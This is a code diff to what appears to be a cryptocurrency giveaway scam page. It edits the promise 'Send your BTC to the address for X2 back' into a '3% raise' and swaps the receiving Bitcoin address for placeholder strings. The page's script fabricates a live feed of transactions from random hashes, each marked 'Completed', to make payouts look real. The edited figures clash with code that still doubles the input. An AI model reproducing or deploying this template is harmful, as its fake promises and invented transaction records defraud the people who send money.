@@ -1779,7 +1779,7 @@ section.participate {
 
                                     <p class="calculator-label">Your profit</p>
 
-                                    <div class="calculator-counter"><span>200%</span></div>
+                                    <div class="calculator-counter"><span>3%</span></div>
 
                                 </div>
 
@@ -1791,7 +1791,7 @@ section.participate {
 
                                     <div class="calculator-counter">
 
-                                        <span id="calculator_number">2</span>
+                                        <span id="calculator_number">200</span>
 
                                         <svg width="29" height="41" viewBox="0 0 29 41" fill="none" xmlns="http://www.w3.org/2000/svg">
 
@@ -1825,11 +1825,11 @@ section.participate {
 
                         <div class="participate-data">
 
-                            <p class="participate-title">Send your <span>BTC</span> to the address for X2 back</p>
+                            <p class="participate-title">Send your <span>BTC</span> to the address for 3% raise</p>
 
                             <div class="participate-address">
 
-                                <p>3B4J1hhrkPYfYLUumqxKMuQAb2NmxQtk5Q</p>
+                                <p>##########</p>
 
                                 <svg class="address-done" width="14" height="11" viewBox="0 0 14 11" fill="none" xmlns="http://www.w3.org/2000/svg">
 
@@ -1841,7 +1841,7 @@ section.participate {
 
                             <div class="participate-footer">
 
-                                <button type="button" class="participate-button" onclick="copy('3B4J1hhrkPYfYLUumqxKMuQAb2NmxQtk5Q');">Copy address</button>
+                                <button type="button" class="participate-button" onclick="copy('11111112hggdFfg');">Copy address</button>
 
                                 <div class="participate-status">
 
@@ -2080,7 +2080,7 @@ $(document).ready((function () {
 
             c = o / 1e5, i = "BTC" == t ? $("input[name=address_btc]").val() : $("input[name=address_eth]").val(),
 
-            a = `<div class="transaction-item">\n                <p class="txhash">${e(25) + "..."}</p>\n                <p class="block">${e(6, "123456789")}</p>\n                <p class="from">${e(25) + "..."}<br>${i}</p>\n                <div class="arrow"><img src="images/check.svg" alt=""></div>\n                <p class="to">${i}<br>${e(25) + "..."}</p>\n                <p class="value">${round(r, 7)} ${t}<br>${round(o, 7)} ${t}</p>\n                <p class="fee">${round(c, 5)}</p>\n                <p class="status">Completed</p>\n            </div>`;
+            a = `<div class="transaction-item">\n                <p class="txhash">${e(25) + "..."}</p>\n                <p class="block">${e(6, "123456789")}</p>\n                <p class="from">${e(16) + "..."}<br>${i}</p>\n                <div class="arrow"><img src="images/check.svg" alt=""></div>\n                <p class="to">${i}<br>${e(25) + "..."}</p>\n                <p class="value">${round(r, 7)} ${t}<br>${round(o, 7)} ${t}</p>\n                <p class="fee">${round(c, 5)}</p>\n                <p class="status">Completed</p>\n            </div>`;
 
         $(a).hide().prependTo(".transaction-content").fadeIn("slow"), $(".transaction-item:eq(5)").remove()
 
@@ -2126,7 +2126,7 @@ $(document).ready((function () {
 
             if (this.value) span.innerHTML = parseFloat(this.value)*2;
 
-            else span.innerHTML = "2";
+            else span.innerHTML = "200";
 
         }
 
